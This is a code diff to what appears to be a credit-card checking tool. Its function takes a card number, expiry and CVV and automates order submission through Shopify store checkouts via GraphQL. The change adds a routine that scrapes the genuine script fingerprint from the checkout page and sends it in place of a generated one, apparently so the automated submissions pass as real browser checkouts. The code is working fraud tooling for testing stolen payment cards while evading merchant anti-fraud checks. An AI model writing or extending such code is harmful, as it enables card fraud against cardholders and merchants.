@@ -167,6 +167,36 @@ def _generate_script_fingerprint():
     }
 
 
+def _extract_script_fingerprint(text):
+    """Extract the real script fingerprint from checkout HTML."""
+    try:
+        # Look for the fingerprint in the checkout page
+        sig_match = re.search(r'"signature"\s*:\s*"([^"]+)"', text)
+        uuid_match = re.search(r'"signatureUuid"\s*:\s*"([^"]+)"', text)
+        if sig_match and uuid_match:
+            return {
+                'signature': sig_match.group(1),
+                'signatureUuid': uuid_match.group(1),
+                'lineItemScriptChanges': [],
+                'paymentScriptChanges': [],
+                'shippingScriptChanges': [],
+            }
+        # Try alternate patterns
+        sig_match2 = re.search(r'signature["\s:=]+["\']([a-f0-9]{40})["\']', text)
+        uuid_match2 = re.search(r'signatureUuid["\s:=]+["\']([a-f0-9-]{36})["\']', text)
+        if sig_match2 and uuid_match2:
+            return {
+                'signature': sig_match2.group(1),
+                'signatureUuid': uuid_match2.group(1),
+                'lineItemScriptChanges': [],
+                'paymentScriptChanges': [],
+                'shippingScriptChanges': [],
+            }
+    except Exception:
+        pass
+    return None
+
+
 def _checkout_graphql_headers(domain, checkout_url):
     source_id = hashlib.md5(f"{domain}{random.random()}".encode()).hexdigest()
     return {
@@ -538,12 +568,16 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
             'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
         }
 
+    # Extract real script fingerprint from checkout page
+    real_fingerprint = _extract_script_fingerprint(text)
+    submit_fingerprint = real_fingerprint if real_fingerprint else _generate_script_fingerprint()
+
     # Step 7: Submit order
     submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
     checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
     attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]
 
-    completion_vars = {'input': {'sessionInput': {'sessionToken': sst}, 'queueToken': latest_qt[0], 'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True}, 'delivery': submit_delivery, 'merchandise': {'merchandiseLines': [submit_merch]}, 'payment': payment_input, 'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'}, 'rememberMe': False}, 'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'scriptFingerprint': _generate_script_fingerprint(), 'optionalDuties': {'buyerRefusesDuties': False}}, 'attemptToken': attempt_token, 'metafields': [], 'analytics': {'requestUrl': checkout_url}}
+    completion_vars = {'input': {'sessionInput': {'sessionToken': sst}, 'queueToken': latest_qt[0], 'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True}, 'delivery': submit_delivery, 'merchandise': {'merchandiseLines': [submit_merch]}, 'payment': payment_input, 'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'}, 'rememberMe': False}, 'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'scriptFingerprint': submit_fingerprint, 'optionalDuties': {'buyerRefusesDuties': False}}, 'attemptToken': attempt_token, 'metafields': [], 'analytics': {'requestUrl': checkout_url}}
 
     async def _do_submit():
         try:
